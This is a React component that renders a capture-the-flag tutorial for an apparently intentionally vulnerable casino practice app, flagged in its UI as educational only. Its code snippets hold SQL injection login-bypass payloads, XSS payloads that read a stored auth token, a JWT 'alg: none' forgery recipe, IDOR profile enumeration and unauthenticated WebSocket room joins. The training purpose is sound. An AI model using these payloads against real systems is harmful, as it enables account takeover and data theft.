import { useState } from 'react';
import { useI18n } from '../hooks/useI18n';

function getTutorialSections(t) {
  return [
    {
      id: 'intro',
      icon: '🎯',
      title: t('ctfTut_introTitle'),
      content: t('ctfTut_introContent'),
      tips: [
        t('ctfTut_introTip1'),
        t('ctfTut_introTip2'),
        t('ctfTut_introTip3'),
      ]
    },
    {
      id: 'devtools',
      icon: '🔧',
      title: t('ctfTut_devtoolsTitle'),
      content: t('ctfTut_devtoolsContent'),
      steps: [
        t('ctfTut_devtoolsStep1'),
        t('ctfTut_devtoolsStep2'),
        t('ctfTut_devtoolsStep3'),
        t('ctfTut_devtoolsStep4'),
        t('ctfTut_devtoolsStep5'),
      ],
      code: {
        title: t('ctfTut_devtoolsCodeTitle'),
        language: 'javascript',
        snippet: `// Open the browser console (F12 → Console tab)\n// Try these commands:\n\n// See your auth token\nlocalStorage.getItem('casino_token')\n\n// Make an API request\nfetch('/api/ctf/challenges', {\n  headers: { 'Authorization': 'Bearer ' + localStorage.getItem('casino_token') }\n}).then(r => r.json()).then(console.log)\n\n// Check for hidden endpoints\nfetch('/api/debug/state').then(r => r.json()).then(console.log)`
      },
      relatedChallenges: [3, 6]
    },
    {
      id: 'sqli',
      icon: '💉',
      title: t('ctfTut_sqliTitle'),
      content: t('ctfTut_sqliContent'),
      steps: [
        t('ctfTut_sqliStep1'),
        t('ctfTut_sqliStep2'),
        t('ctfTut_sqliStep3'),
        t('ctfTut_sqliStep4'),
      ],
      code: {
        title: t('ctfTut_sqliCodeTitle'),
        language: 'sql',
        snippet: `-- Normal login query:\nSELECT * FROM users WHERE username = 'alice' AND password = '1234'\n\n-- What if username = ' OR 1=1 -- ?\nSELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'\n--                                        ^^^^^^^^ always true!\n--                                                   ^^^ commented out!\n\n-- Other useful payloads:\n-- admin'--\n-- ' OR '1'='1' --\n-- ' UNION SELECT null,null,null --`
      },
      warning: t('ctfTut_sqliWarning'),
      relatedChallenges: [1]
    },
    {
      id: 'xss',
      icon: '📜',
      title: t('ctfTut_xssTitle'),
      content: t('ctfTut_xssContent'),
      steps: [
        t('ctfTut_xssStep1'),
        t('ctfTut_xssStep2'),
        t('ctfTut_xssStep3'),
        t('ctfTut_xssStep4'),
      ],
      code: {
        title: t('ctfTut_xssCodeTitle'),
        language: 'html',
        snippet: `<!-- Test if input is reflected as HTML -->\n<b>test</b>\n\n<!-- Simple alert test -->\n<img src=x onerror="alert('XSS!')">\n\n<!-- Steal data with XSS -->\n<img src=x onerror="fetch('/api/secret',{\n  headers:{'Authorization':'Bearer '+localStorage.getItem('casino_token')}\n}).then(r=>r.json()).then(d=>alert(JSON.stringify(d)))">`
      },
      relatedChallenges: [2]
    },
    {
      id: 'jwt',
      icon: '🔑',
      title: t('ctfTut_jwtTitle'),
      content: t('ctfTut_jwtContent'),
      steps: [
        t('ctfTut_jwtStep1'),
        t('ctfTut_jwtStep2'),
        t('ctfTut_jwtStep3'),
        t('ctfTut_jwtStep4'),
        t('ctfTut_jwtStep5'),
      ],
      code: {
        title: t('ctfTut_jwtCodeTitle'),
        language: 'javascript',
        snippet: `// A JWT has 3 parts: HEADER.PAYLOAD.SIGNATURE\n// Example: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature\n\n// Decode your token in the browser console:\nconst token = localStorage.getItem('casino_token');\nconst parts = token.split('.');\nconsole.log('Header:', JSON.parse(atob(parts[0])));\nconsole.log('Payload:', JSON.parse(atob(parts[1])));\n\n// The "alg: none" attack:\n// 1. Change header to: {"alg":"none","typ":"JWT"}\n// 2. Change payload: {"user_id":1,"username":"admin","is_admin":true}\n// 3. Encode both in base64, remove the signature\n// 4. Result: base64(header).base64(payload).`
      },
      relatedChallenges: [4]
    },
    {
      id: 'idor',
      icon: '🔍',
      title: t('ctfTut_idorTitle'),
      content: t('ctfTut_idorContent'),
      steps: [
        t('ctfTut_idorStep1'),
        t('ctfTut_idorStep2'),
        t('ctfTut_idorStep3'),
      ],
      code: {
        title: t('ctfTut_idorCodeTitle'),
        language: 'http',
        snippet: `# Your profile (ID = 5)\nGET /api/ctf/profile/5\n\n# What about ID = 1? (usually admin)\nGET /api/ctf/profile/1   ← Try this!\n\n# Or enumerate all users:\nGET /api/ctf/profile/2\nGET /api/ctf/profile/3\n...`
      },
      relatedChallenges: [3]
    },
    {
      id: 'websocket',
      icon: '🔌',
      title: t('ctfTut_wsTitle'),
      content: t('ctfTut_wsContent'),
      steps: [
        t('ctfTut_wsStep1'),
        t('ctfTut_wsStep2'),
        t('ctfTut_wsStep3'),
        t('ctfTut_wsStep4'),
      ],
      code: {
        title: t('ctfTut_wsCodeTitle'),
        language: 'javascript',
        snippet: `// In the browser console, connect to Socket.IO WITHOUT auth:\nimport('https://cdn.socket.io/4.7.5/socket.io.esm.min.js')\n  .then(({ io }) => {\n    const socket = io(window.location.origin, {\n      transports: ['websocket']\n      // No auth! 👻\n    });\n    socket.on('connected', data => {\n      console.log('Response:', data);\n      // Check for CTF flags in the response!\n    });\n    // Try joining a private room:\n    socket.emit('join_room', { room_id: 'admin-private' });\n    socket.on('room_joined', data => console.log('Room:', data));\n  });`
      },
      relatedChallenges: [5, 7, 8, 9]
    },
    {
      id: 'intercept',
      icon: '📡',
      title: t('ctfTut_interceptTitle'),
      content: t('ctfTut_interceptContent'),
      steps: [
        t('ctfTut_interceptStep1'),
        t('ctfTut_interceptStep2'),
        t('ctfTut_interceptStep3'),
        t('ctfTut_interceptStep4'),
      ],
      code: {
        title: t('ctfTut_interceptCodeTitle'),
        language: 'javascript',
        snippet: `// Monitor all WebSocket messages in the console:\n// 1. Open DevTools → Network → WS tab\n// 2. Click the WebSocket connection\n// 3. Watch messages in real-time\n\n// Or intercept fetch requests:\nconst originalFetch = window.fetch;\nwindow.fetch = function(...args) {\n  console.log('📡 Request:', args);\n  return originalFetch.apply(this, args)\n    .then(r => { console.log('📨 Response:', r); return r; });\n};`
      },
      relatedChallenges: [5, 9]
    },
    {
      id: 'tools',
      icon: '🧰',
      title: t('ctfTut_toolsTitle'),
      content: t('ctfTut_toolsContent'),
      toolsList: [
        { name: 'DevTools (F12)', desc: t('ctfTut_tool1'), icon: '🌐' },
        { name: 'jwt.io', desc: t('ctfTut_tool2'), icon: '🔑', url: 'https://jwt.io' },
        { name: 'Burp Suite', desc: t('ctfTut_tool3'), icon: '🕵️' },
        { name: 'curl / Postman', desc: t('ctfTut_tool4'), icon: '📮' },
        { name: 'CyberChef', desc: t('ctfTut_tool5'), icon: '🧪', url: 'https://gchq.github.io/CyberChef/' },
        { name: 'wscat', desc: t('ctfTut_tool6'), icon: '🔌' },
      ]
    }
  ];
}

export default function CTFTutorialPage() {
  const { t } = useI18n();
  const [activeSection, setActiveSection] = useState('intro');
  const [expandedCode, setExpandedCode] = useState({});
  const sections = getTutorialSections(t);
  const current = sections.find(s => s.id === activeSection) || sections[0];

  const toggleCode = (id) => {
    setExpandedCode(prev => ({ ...prev, [id]: !prev[id] }));
  };

  return (
    <div className="container" style={{ paddingTop: '1rem', paddingBottom: '2rem' }}>
      {/* Header */}
      <div className="page-header">
        <div>
          <h1 className="page-title">🛡️ {t('ctfTut_pageTitle')}</h1>
          <p className="page-subtitle">{t('ctfTut_pageSubtitle')}</p>
        </div>
        <div style={{
          background: 'var(--accent-red-dim)', padding: '0.5rem 1.2rem',
          borderRadius: 'var(--radius-xl)', color: 'var(--accent-red)', fontWeight: 700,
          fontSize: '0.85rem'
        }}>
          ⚠️ {t('ctfTut_educationalOnly')}
        </div>
      </div>

      {/* Navigation pills */}
      <div className="ctf-tut-nav">
        {sections.map(s => (
          <button key={s.id}
            className={`ctf-tut-pill ${activeSection === s.id ? 'active' : ''}`}
            onClick={() => setActiveSection(s.id)}>
            <span className="ctf-tut-pill-icon">{s.icon}</span>
            <span className="ctf-tut-pill-label">{s.title}</span>
          </button>
        ))}
      </div>

      {/* Content */}
      <div className="card fade-in" key={current.id} style={{ maxWidth: '820px' }}>
        {/* Section header */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '1.25rem' }}>
          <span style={{ fontSize: '2rem' }}>{current.icon}</span>
          <h2 style={{ fontFamily: 'Outfit', fontWeight: 700, fontSize: '1.4rem' }}>{current.title}</h2>
        </div>

        {/* Description */}
        <p style={{ color: 'var(--text-secondary)', lineHeight: 1.7, marginBottom: '1.5rem' }}>
          {current.content}
        </p>

        {/* Warning box */}
        {current.warning && (
          <div className="ctf-tut-warning fade-in">
            ⚠️ {current.warning}
          </div>
        )}

        {/* Tips list */}
        {current.tips && (
          <div className="ctf-tut-tips">
            {current.tips.map((tip, i) => (
              <div key={i} className="ctf-tut-tip fade-in" style={{ animationDelay: `${i * 0.1}s` }}>
                <span className="ctf-tut-tip-num">{i + 1}</span>
                <span>{tip}</span>
              </div>
            ))}
          </div>
        )}

        {/* Steps */}
        {current.steps && (
          <div className="ctf-tut-steps">
            <h3 className="ctf-tut-section-title">{t('ctfTut_stepsTitle')}</h3>
            {current.steps.map((step, i) => (
              <div key={i} className="ctf-tut-step fade-in" style={{ animationDelay: `${i * 0.08}s` }}>
                <div className="ctf-tut-step-num">{i + 1}</div>
                <p>{step}</p>
              </div>
            ))}
          </div>
        )}

        {/* Code example */}
        {current.code && (
          <div className="ctf-tut-code-block">
            <button className="ctf-tut-code-toggle" onClick={() => toggleCode(current.id)}>
              <span>💻 {current.code.title}</span>
              <span style={{ fontSize: '0.8rem' }}>
                {expandedCode[current.id] ? '▲ ' + t('ctfTut_hideCode') : '▼ ' + t('ctfTut_showCode')}
              </span>
            </button>
            {expandedCode[current.id] && (
              <pre className="ctf-tut-code fade-in">
                <code>{current.code.snippet}</code>
              </pre>
            )}
          </div>
        )}

        {/* Tools list */}
        {current.toolsList && (
          <div className="ctf-tut-tools-grid">
            {current.toolsList.map((tool, i) => (
              <div key={i} className="ctf-tut-tool-card fade-in" style={{ animationDelay: `${i * 0.08}s` }}>
                <div className="ctf-tut-tool-icon">{tool.icon}</div>
                <div>
                  <div className="ctf-tut-tool-name">
                    {tool.url ? (
                      <a href={tool.url} target="_blank" rel="noopener noreferrer">{tool.name} ↗</a>
                    ) : tool.name}
                  </div>
                  <div className="ctf-tut-tool-desc">{tool.desc}</div>
                </div>
              </div>
            ))}
          </div>
        )}

        {/* Related challenges */}
        {current.relatedChallenges && current.relatedChallenges.length > 0 && (
          <div className="ctf-tut-related">
            <span className="ctf-tut-related-label">🔗 {t('ctfTut_relatedChallenges')}:</span>
            {current.relatedChallenges.map(id => (
              <span key={id} className="ctf-tut-related-badge">#{id}</span>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
